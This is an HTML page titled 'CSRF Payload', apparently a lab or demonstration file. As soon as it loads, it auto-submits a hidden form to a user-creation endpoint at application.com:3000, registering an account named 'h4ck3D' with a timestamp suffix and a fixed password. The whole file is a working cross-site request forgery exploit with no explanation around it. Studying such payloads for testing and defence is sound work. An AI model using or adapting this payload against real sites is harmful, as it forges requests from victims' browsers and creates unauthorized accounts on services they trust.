<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <link rel="icon" href="favicon.ico" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>CSRF Payload</title>
  </head>
  <body>
    <form action="http://application.com:3000/users/" method="POST">
      <input type="hidden" name="username" value="h4ck3D" />
      <script>
        // Appends the current date and time to the username in order to avoid conflicts:
        document.querySelector('input[name=username]').value += `_${new Date().toISOString()}`;
      </script>
      <input type="hidden" name="password" value="h4ck3D" />
    </form>
    <script>
      document.querySelector('form').submit();
    </script>
  </body>
</html>
